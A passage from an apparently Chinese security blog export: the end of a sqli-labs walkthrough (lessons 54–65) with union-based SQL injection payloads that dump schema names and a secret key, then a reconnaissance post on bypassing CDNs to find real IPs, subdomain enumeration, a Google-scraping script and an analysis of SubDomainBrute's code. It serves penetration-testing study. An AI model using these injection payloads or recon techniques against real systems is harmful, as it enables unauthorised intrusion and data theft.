class=\"string\">&#x27;union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23</span></span><br><span class=\"line\"><span class=\"string\">information_schema,challenges,mysql,performance_schema,security</span></span><br></pre></td></tr></table></figure>\n\n<p>查表名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27;union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>challenges<span class=\"string\">&#x27;)%23</span></span><br><span class=\"line\"><span class=\"string\">1KBD9AIPC9</span></span><br></pre></td></tr></table></figure>\n\n<p>查字段名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27;union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class=\"number\">1</span>KBD9AIPC9<span class=\"string\">&#x27;)%23</span></span><br><span class=\"line\"><span class=\"string\">id,sessid,secret_2TF1,tryy</span></span><br></pre></td></tr></table></figure>\n\n<p>查key值</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27;union select 1,2,(select concat(secret_2TF1) from challenges.1KBD9AIPC9)%23</span></span><br><span class=\"line\"><span class=\"string\">vJWlm4ld9mZEZN2o7n59t4A8</span></span><br></pre></td></tr></table></figure>\n\n<p>总共八次。</p>\n<h4 id=\"3-5-2-Less-55\"><a href=\"#3-5-2-Less-55\" class=\"headerlink\" title=\"3.5.2 Less-55\"></a>3.5.2 Less-55</h4><p>无区别。</p>\n<h4 id=\"3-5-3-Less-56\"><a href=\"#3-5-3-Less-56\" class=\"headerlink\" title=\"3.5.3 Less-56\"></a>3.5.3 Less-56</h4><p>无区别。</p>\n<h4 id=\"3-5-4-Less-57\"><a href=\"#3-5-4-Less-57\" class=\"headerlink\" title=\"3.5.4 Less-57\"></a>3.5.4 Less-57</h4><p>无区别。</p>\n<h4 id=\"3-5-5-Less-58\"><a href=\"#3-5-5-Less-58\" class=\"headerlink\" title=\"3.5.5 Less-58\"></a>3.5.5 Less-58</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Your Login name : &#x27;</span>. <span class=\"variable\">$unames</span>[<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>]];</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Your Password : &#x27;</span> .<span class=\"variable\">$pass</span>[<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>]];</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p>联合查询没结果输出，改为报错注入。</p>\n<h4 id=\"3-5-6-Less-59\"><a href=\"#3-5-6-Less-59\" class=\"headerlink\" title=\"3.5.6 Less-59\"></a>3.5.6 Less-59</h4><p>无区别。</p>\n<h4 id=\"3-5-7-Less-60\"><a href=\"#3-5-7-Less-60\" class=\"headerlink\" title=\"3.5.7 Less-60\"></a>3.5.7 Less-60</h4><p>无区别。</p>\n<h4 id=\"3-5-8-Less-61\"><a href=\"#3-5-8-Less-61\" class=\"headerlink\" title=\"3.5.8 Less-61\"></a>3.5.8 Less-61</h4><p>无区别。</p>\n<h4 id=\"3-5-9-Less-62\"><a href=\"#3-5-9-Less-62\" class=\"headerlink\" title=\"3.5.9 Less-62\"></a>3.5.9 Less-62</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class=\"subst\">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Your Login name : &#x27;</span>. <span class=\"variable\">$unames</span>[<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>]];</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Your Password : &#x27;</span> .<span class=\"variable\">$pass</span>[<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>]];</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"comment\">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure>\n\n<p>不能报错注入了，改为布尔盲注或者时间盲注即可</p>\n<h4 id=\"3-5-9-Less-63\"><a href=\"#3-5-9-Less-63\" class=\"headerlink\" title=\"3.5.9 Less-63\"></a>3.5.9 Less-63</h4><p>无区别。</p>\n<h4 id=\"3-5-10-Less-64\"><a href=\"#3-5-10-Less-64\" class=\"headerlink\" title=\"3.5.10 Less-64\"></a>3.5.10 Less-64</h4><p>无区别。</p>\n<h4 id=\"3-5-1-Less-65\"><a href=\"#3-5-1-Less-65\" class=\"headerlink\" title=\"3.5.1 Less-65\"></a>3.5.1 Less-65</h4><p>无区别。</p>\n<h3 id=\"3-6-总结\"><a href=\"#3-6-总结\" class=\"headerlink\" title=\"3.6 总结\"></a>3.6 总结</h3><p>终于是刷完了，总体来说把每种注入方式都练习了个遍，并学习了一些绕过手法，整个过程除了<code>Less-1</code>跟着大佬把<code>sqlmap</code>使用熟悉了一下，其余均为手注，加强自己的能力，尽量不变成离了脚本就活不了的脚本小子（）。但是其实还有许多利用手法没有学到，以后遇到就在本文填补，避免做完就忘了。</p>\n"},{"title":"信息收集(TODO)","hide":false,"abbrlink":56033,"date":"2025-03-03T15:25:57.000Z","_content":"\n\n\n# 信息收集\n\n> 信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。\n\n## 域名（Domain）\n\n> 域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。\n\n### 判断CDN\n\n内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？\n\nCDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。\n\n**ping域名判断是否有CDN**\n\n当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png)\n\n**nslookup判断CDN**\n\nnslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。\n\n通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png)\n\n**多地ping判断CDN**\n\n[站长工具](https://ping.chinaz.com/)还是比较直观的\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png)\n\n### 查看真实IP\n\n检测完CDN，就该绕过CDN检测了，获取真实IP\n\n**多地ping**\n\n不仅是检测CDN，同时也可以用来判断。\n\n如`www.youzan.com`，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png)\n\n**子域名查询真实IP**\n\nCDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。\n\n**DNS历史记录**\n\n查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，[Viewdns](https://viewdns.info/)或者之前的开发工具都可以查询\n\n**SSL证书**\n\n加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。\n\n**漏洞查找**\n\n- 敏感文件泄露，如phpinfo等，github信息泄露等。\n- XSS、命令执行、SSRF等。\n- 社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。\n\n**网站邮件**\n\n很多网站都自带`sendmail`，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP\n\n**F5 LTM解码**\n\n当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP\n\n```\nSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000\n先把第一小节的十进制数取出来：487098378\n再转化为十六进制数：1d08880a\n从后至前取四位数：0a.88.08.1d\n转化为十进制即为IP：10.136.8.29\n```\n\n### 子域名收集\n\n在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。\n\n**搜索引擎收集**\n\n使用谷歌语法等可以收集大量信息，如`site:domain`\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png)\n\n尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能\n\n```python\nimport argparse\nimport re\nimport signal\nimport sys\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\n\n# write to file\ndef write_file(file_path, content):\n    try:\n        with open(file_path, 'a', encoding='utf-8') as file:\n            file.write(content + '\\n')\n        return True\n    except Exception as e:\n        print(e)\n        return False\n\n\n# signal handler\ndef signal_handler(sig, frame):\n    print(\"\\nuser pause\")\n    sys.exit(0)\n\n\n# init selenium\ndef setup_driver():\n    options = webdriver.ChromeOptions()\n    options.add_argument(\"--headless\")\n    return webdriver.Chrome(options=options)\n\n\n# get domain in links\ndef extract_domain(link):\n    match = re.search(r\"https://(.*?)/\", link)\n    if match:\n        return match.group(1)\n    return None\n\n\n# fetch links from result\ndef fetch_links(driver, domain, page):\n    url = f\"https://www.google.com/search?q=site:{domain}&start={page}0\"\n    driver.get(url)\n\n    try:\n        elements = driver.find_elements(By.CSS_SELECTOR, \"#rso .kb0PBd.A9Y9g.jGGQ5e span > a\")\n        links = []\n        for element in elements:\n            link = element.get_attribute(\"href\")\n            if link:\n                links.append(link)\n        return links\n    except Exception as e:\n        print(f\"failed to fetch links: {e}\")\n        return []\n\n\n# main\ndef main():\n    # signal init\n    signal.signal(signal.SIGINT, signal_handler)\n\n    # parse user input\n    parser = argparse.ArgumentParser(description=\"Chrome search script\")\n    parser.add_argument(\"-d\", \"--domain\", required=True, help=\"The domain to search\")\n    parser.add_argument(\"-m\", \"--maxpage\", type=int, required=True, help=\"The maximum number to search\")\n    args = parser.parse_args()\n\n    # parameter assignment\n    domain = args.domain\n    max_page = args.maxpage\n\n    # init driver\n    driver = setup_driver()\n\n    # remove duplicates\n    unique_links = set()\n\n    # Start crawling from the first page\n    for page in range(0, max_page + 1):\n        links = fetch_links(driver, domain, page)\n\n        # Traverse links, extract and save unique domain names\n        for link in links:\n            domain_name = extract_domain(link)\n            if domain_name and domain_name not in unique_links:\n                unique_links.add(domain_name)\n                print(domain_name)\n                write_file(\"domain.txt\", domain_name)\n\n    # close driver\n    driver.quit()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**资产测绘工具搜集**\n\n使用资产测绘工具收集，如**fofa、hunter、360quake、微步**等，包括使用站长之家等等。\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png)\n\n**使用自动化工具**\n\n这里对两种开源的工具进行源码分析，了解其原理\n\n#### **SubDomainBrute源码分析**\n\n这里只分析主要代码\n\n```python\n# 加载DNS服务器地址\ndef load_dns_servers():\n    print_msg('[+] Validate DNS servers', line_feed=True)\n    dns_servers = []\n\n    servers_to_test = []\n    # 从字典中加载未被注释的DNS服务器地址\n    for server in open(os.path.join(root_path, 'dict/dns_servers.txt')).readlines():\n        server = server.strip()\n        if server and not server.startswith('#'):\n            servers_to_test.append(server)\n\n\t# 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))\n\n    # 打印有效DNS服务器地址\n    server_count = len(dns_servers)\n    print_msg('\\n[+] %s DNS Servers found' % server_count, line_feed=True)\n    if server_count == 0:\n        print_msg('[ERROR] No valid DNS Server !', line_feed=True)\n        sys.exit(-1)\n    return dns_servers\n\n# 加载子域名爆破字典\ndef load_next_sub(full_scan):\n    next_subs = []\n    # 根据full_scan参数判断加载哪个字典\n    _file = 'dict/next_sub_full.txt' if full_scan else 'dict/next_sub.txt'\n    \n    # 将子域名去重后存入临时集合tmp_set\n    with open(os.path.join(root_path, _file)) as f:\n        for line in f:\n            sub = line.strip()\n            if sub and sub not in next_subs:\n                tmp_set = {sub}\n                \n                # 如果子域名模块包含占位符，如{alphnum}，则进行替换操作\n                while tmp_set:\n                    item = tmp_set.pop()\n                    if item.find('{alphnum}') >= 0:\n                        for _letter in 'abcdefghijklmnopqrstuvwxyz0123456789':\n                            tmp_set.add(item.replace('{alphnum}', _letter, 1))\n                    elif item.find('{alpha}') >= 0:\n                        for _letter in 'abcdefghijklmnopqrstuvwxyz':\n                            tmp_set.add(item.replace('{alpha}', _letter, 1))\n                    elif item.find('{num}') >= 0:\n                        for _letter in '0123456789':\n                            tmp_set.add(item.replace('{num}', _letter, 1))\n                    elif item not in next_subs:\n                        next_subs.append(item)\n    return next_subs\n```\n\n加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。\n\n在子域名中还存在一个**泛解析**的问题，这个工具里面解决了这个问题\n\n```python\nasync def async_wildcard_test(domain, dns_servers, level=1):\n    try:\n        # 创建异步DNS解析器\n        r = dns.asyncresolver.Resolver()\n        # 使用DNS服务器解析域名\n        r.nameservers = dns_servers\n        # 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在\n        answers = await r.resolve('lijiejie-not-existed-test.%s' % domain, 'A', lifetime=10)\n        # 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析\n        ips = ', '.join(sorted([answer.address for answer in answers]))\n        # 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2\n        if level == 1:\n            print('any-sub.%s\\t%s' % (domain.ljust(30), ips))\n            await async_wildcard_test('any-sub.%s' % domain, dns_servers, 2)\n        # 打印提示信息，使用-w参数强制扫描通配符域名\n        elif level == 2:\n            print('\\nUse -w to enable force scan wildcard domain')\n            sys.exit(0)\n    except Exception as e:\n        return domain\n\ndef wildcard_test(domain, dns_servers):\n    # 获取当前的异步事件循环\n    loop = asyncio.get_event_loop()\n    # 等待异步任务完成\n    return loop.run_until_complete(\n        # 并行执行多个异步任务，并返回它们的结果\n        asyncio.gather(\n            async_wildcard_test(domain, dns_servers, level=1)\n        )\n    )[0]\n```\n\n通过给出一个不存在的域名检测，判断是否开启了泛解析\n\n接下来看看扫描模块\n\n```python\n# 爆破模块\nclass SubNameBrute(object):\n    # 初始化\n    def __init__(self, *params):\n        # 提取传入参数\n        self.domain, self.options, self.process_num, self.dns_servers, self.next_subs, \\\n            self.scan_count, self.found_count, self.queue_size_array, tmp_dir = params\n        self.dns_count = len(self.dns_servers)\n        self.scan_count_local = 0\n        self.found_count_local = 0\n        # 初始化DNS解析器\n        self.resolvers = [dns.asyncresolver.Resolver(configure=False) for _ in range(self.options.threads)]\n        for r in self.resolvers:\n            # 解析事件\n            r.lifetime = 6.0\n            # 超时时间\n            r.timeout = 10.0\n        # 优先队列和状态变量\n        self.queue = PriorityQueue()\n        self.ip_dict = {}\n        self.found_subs = set()\n        self.cert_subs = set()\n        self.timeout_subs = {}\n        self.no_server_subs = {}\n        self.count_time = time.time()\n        # 输出日志到文件\n        self.outfile = open('%s/%s_part_%s.txt' % (tmp_dir, self.domain, self.process_num), 'w')\n        self.normal_names_set = set()\n        self.lock = asyncio.Lock()\n        # 线程状态\n        self.threads_status = ['1'] * self.options.threads\n\n    # 加载子域名字典\n    async def load_sub_names(self):\n        normal_lines = []\n        wildcard_lines = []\n        wildcard_set = set()\n        regex_list = []\n        lines = set()\n        # 打开文件逐行读取子域名，跳过空行或重复子域名\n        with open(self.options.file) as inFile:\n            for line in inFile.readlines():\n                sub = line.strip()\n                if not sub or sub in lines:\n                    continue\n                lines.add(sub)\n\n                # 判断子域名是否含占位符\n                brace_count = sub.count('{')\n                if brace_count > 0:\n                    wildcard_lines.append((brace_count, sub))\n\t\t\t\t\t# 占位符处理\n                    sub = sub.replace('{alphnum}', '[a-z0-9]')\n                    sub = sub.replace('{alpha}', '[a-z]')\n                    sub = sub.replace('{num}', '[0-9]')\n                    # 去重\n                    if sub not in wildcard_set:\n                        wildcard_set.add(sub)\n                        regex_list.append('^' + sub + '$')\n                else:\n                    # 普通子域名直接加入列表\n                    normal_lines.append(sub)\n                    self.normal_names_set.add(sub)\n\n        if regex_list:\n            pattern = '|'.join(regex_list)\n            _regex = re.compile(pattern)\n            for line in normal_lines:\n                if _regex.search(line):\n                    normal_lines.remove(line)\n\t\t\n        # 普通子域名加入队列，优先级为0\n        for _ in normal_lines[self.process_num::self.options.process]:\n            await self.queue.put((0, _))    # priority set to 0\n        \n        # 含占位符的子域名直接加入队列\n        for _ in wildcard_lines[self.process_num::self.options.process]:\n            await self.queue.put(_)\n\n    # 检测进程状态\n    async def update_counter(self):\n        while True:\n            if '1' not in self.threads_status:\n                return\n            self.scan_count.value += self.scan_count_local\n            self.scan_count_local = 0\n            self.queue_size_array[self.process_num] = self.queue.qsize()\n            if self.found_count_local:\n                self.found_count.value += self.found_count_local\n                self.found_count_local = 0\n            self.count_time = time.time()\n            await asyncio.sleep(0.5)\n\n    # 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名\n    async def check_https_alt_names(self, domain):\n        try:\n            # 建立异步HTTPS连接\n            reader, _ = await asyncio.open_connection(\n                host=domain,\n                port=443,\n                ssl=True,\n                server_hostname=domain,\n            )\n            # 获取证书详细信息\n            for item in reader._transport.get_extra_info('peercert')['subjectAltName']:\n                if item[0].upper() == 'DNS':\n                    name = item[1].lower()\n                    # 筛选符合条件的子域名\n                    if name.endswith(self.domain):\n                        sub = name[:len(name) - len(self.domain) - 1]    # new sub\n                        sub = sub.replace('*', '')\n                        sub = sub.strip('.')\n                        # 去重并添加到任务队列\n                        if sub and sub not in self.found_subs and \\\n                                sub not in self.normal_names_set and sub not in self.cert_subs:\n                            self.cert_subs.add(sub)\n                            await self.queue.put((0, sub))\n        except Exception as e:\n            pass\n\n\n    # 查询DNS解析结果，并限制查询的超时时间\n    async def do_query(self, j, cur_domain):\n        async with timeout(10.2):\n            return await self.resolvers[j].resolve(cur_domain, 'A')\n\n    # 扫描\n    async def scan(self, j):\n        # 设置DNS解析器\n        self.resolvers[j].nameservers = [self.dns_servers[j % self.dns_count]]\n        if self.dns_count > 1:\n            while True:\n                s = random.choice(self.dns_servers)\n                if s != self.dns_servers[j % self.dns_count]:\n                    self.resolvers[j].nameservers.append(s)\n                    break\n        empty_counter = 0\n        \n        # 处理子域\n        while True:\n            try:\n                brace_count, sub = self.queue.get_nowait()\n                self.threads_status[j] = '1'\n                empty_counter = 0\n            except asyncio.queues.QueueEmpty as e:\n                empty_counter += 1\n                if empty_counter > 10:\n                    self.threads_status[j] = '0'\n                if '1' not in self.threads_status:\n                    break\n                else:\n                    await asyncio.sleep(0.1)\n                    continue\n\n            # 对于带有通配符的子域进行处理\n            if brace_count > 0:\n                brace_count -= 1\n                if sub.find('{next_sub}') >= 0:\n                    for _ in self.next_subs:\n                        await self.queue.put((0, sub.replace('{next_sub}', _)))\n                if sub.find('{alphnum}') >= 0:\n                    for _ in 'abcdefghijklmnopqrstuvwxyz0123456789':\n                        await self.queue.put((brace_count, sub.replace('{alphnum}', _, 1)))\n                elif sub.find('{alpha}') >= 0:\n                    for _ in 'abcdefghijklmnopqrstuvwxyz':\n                        await self.queue.put((brace_count, sub.replace('{alpha}', _, 1)))\n                elif sub.find('{num}') >= 0:\n                    for _ in '0123456789':\n                        await self.queue.put((brace_count, sub.replace('{num}', _, 1)))\n                continue\n\n            try:\n                if sub in self.found_subs:\n                    continue\n\n                self.scan_count_local += 1\n                cur_domain = sub + '.' + self.domain\n\n                # 执行DNS查询\n                answers = await self.do_query(j, cur_domain)\n                \n                # 处理DNS查询结果，排除无效IP\n                if answers:\n                    self.found_subs.add(sub)\n                    ips = ', '.join(sorted([answer.address for answer in answers]))\n                    invalid_ip_found = False\n                    for answer in answers:\n                        if answer.address in ['1.1.1.1', '127.0.0.1', '0.0.0.0', '0.0.0.1']:\n                            invalid_ip_found = True\n                    if invalid_ip_found:\n                        continue\n                    if self.options.i and is_intranet(answers[0].host):\n                        continue\n\n                    try:\n                        # 查询CNAME记录\n                        cname = str(answers.canonical_name)[:-1]\n                        if cname != cur_domain and cname.endswith(self.domain):\n                            cname_sub = cname[:len(cname) - len(self.domain) - 1]    # new sub\n                            if cname_sub not in self.found_subs and cname_sub not in self.normal_names_set:\n                                await self.queue.put((0, cname_sub))\n                    except Exception as e:\n                        pass\n\n                    first_level_sub = sub.split('.')[-1]\n                    max_found = 20\n\n                    if self.options.w:\n                        first_level_sub = ''\n                        max_found = 3\n\n                    if (first_level_sub, ips) not in self.ip_dict:\n                        self.ip_dict[(first_level_sub, ips)] = 1\n                    else:\n                        self.ip_dict[(first_level_sub, ips)] += 1\n                        if self.ip_dict[(first_level_sub, ips)] > max_found:\n                            continue\n\n                    self.found_count_local += 1\n\n                    # 将查询结果写入文件\n                    self.outfile.write(cur_domain.ljust(30) + '\\t' + ips + '\\n')\n                    self.outfile.flush()\n\n                    # 检查HTTPS证书\n                    if not self.options.no_cert_check:\n                        async with timeout(10.0):\n                            await self.check_https_alt_names(cur_domain)\n\n                    try:\n                        self.scan_count_local += 1\n                        await self.do_query(j, 'lijiejie-test-not-existed.' + cur_domain)\n\n                    except dns.resolver.NXDOMAIN as e:\n                        if self.queue.qsize() < 20000:\n                            for _ in self.next_subs:\n                                await self.queue.put((0, _ + '.' + sub))\n                        else:\n                            await self.queue.put((1, '{next_sub}.' + sub))\n                    except Exception as e:\n                        continue\n\n            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) as e:\n                pass\n            except dns.resolver.NoNameservers as e:\n                self.no_server_subs[sub] = self.no_server_subs.get(sub, 0) + 1\n                if self.no_server_subs[sub] <= 3:\n                    await self.queue.put((0, sub))    # Retry again\n            except (dns.exception.Timeout, dns.resolver.LifetimeTimeout) as e:\n                self.timeout_subs[sub] = self.timeout_subs.get(sub, 0) + 1\n                if self.timeout_subs[sub] <= 3:\n                    await self.queue.put((0, sub))    # Retry again\n            except Exception as e:\n                if str(type(e)).find('asyncio.exceptions.TimeoutError') < 0:\n                    with open('errors.log', 'a') as errFile:\n                        errFile.write('[%s] %s\\n' % (type(e), str(e)))\n\n    async def async_run(self):\n        await self.load_sub_names()\n        tasks = [self.scan(i) for i in range(self.options.threads)]\n        tasks.insert(0, self.update_counter())\n        await asyncio.gather(*tasks)\n\n    def run(self):\n        loop = asyncio.get_event_loop()\n        asyncio.set_event_loop(loop)\n        loop.run_until_complete(self.async_run())\n\ndef run_process(*params):\n    # 信号处理器\n    signal.signal(signal.SIGINT, user_abort)\n    # 调用SubNameBrute的run方法\n    s = SubNameBrute(*params)\n    s.run()\n\n# 根据option.process启动多个进程\nfor process_num in range(options.process):\n    p = multiprocessing.Process(\n        # 调用run_process进行扫描\n        target=run_process,\n        args=(domain, options, process_num, dns_servers, next_subs,\n              scan_count, found_count, queue_size_array, tmp_dir)\n    )\n    all_process.append(p)\n    p.start()\n```\n\n总体的工作路径为：\n\n- **加载子域名**：从文件中读取子域名，识别通配符，放入任务队列\n- 扫描子域\n  - 多线程扫描子域\n  - 对每个子域执行DNS查询，处理返回结果\n  - 对子域名进行证书检查，CNAME解析等附加操作\n- **记录结果**\n- **错误处理与重试**：对于DNS查询失败的子域进行重试，最多三次\n\n这里有个证书检查和CNAME解析，还有一个称呼叫**证书透明度**主要原因是**提高全面性**。在**SSL/TLS**证书中的`subjectAltName`字段会暴露一些隐藏子域。**CNAME**是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。\n\n**对于通配符子域名的处理**：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。\n","source":"_posts/信息收集(TODO).md","raw":"---\ntitle: 信息收集(TODO)\ntags:\n  - 网络安全\nhide: false\nabbrlink: 56033\ndate: 2025-03-03 23:25:57\n---\n\n\n\n# 信息收集\n\n> 信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。\n\n## 域名（Domain）\n\n> 域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。\n\n### 判断CDN\n\n内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？\n\nCDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。\n\n**ping域名判断是否有CDN**\n\n当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png)\n\n**nslookup判断CDN**\n\nnslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。\n\n通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png)\n\n**多地ping判断CDN**\n\n[站长工具](https://ping.chinaz.com/)还是比较直观的\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png)\n\n### 查看真实IP\n\n检测完CDN，就该绕过CDN检测了，获取真实IP\n\n**多地ping**\n\n不仅是检测CDN，同时也可以用来判断。\n\n如`www.youzan.com`，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png)\n\n**子域名查询真实IP**\n\nCDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。\n\n**DNS历史记录**\n\n查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，[Viewdns](https://viewdns.info/)或者之前的开发工具都可以查询\n\n**SSL证书**\n\n加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。\n\n**漏洞查找**\n\n- 敏感文件泄露，如phpinfo等，github信息泄露等。\n- XSS、命令执行、SSRF等。\n- 社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。\n\n**网站邮件**\n\n很多网站都自带`sendmail`，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP\n\n**F5 LTM解码**\n\n当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP\n\n```\nSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000\n先把第一小节的十进制数取出来：487098378\n再转化为十六进制数：1d08880a\n从后至前取四位数：0a.88.08.1d\n转化为十进制即为IP：10.136.8.29\n```\n\n### 子域名收集\n\n在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。\n\n**搜索引擎收集**\n\n使用谷歌语法等可以收集大量信息，如`site:domain`\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png)\n\n尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能\n\n```python\nimport argparse\nimport re\nimport signal\nimport sys\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import 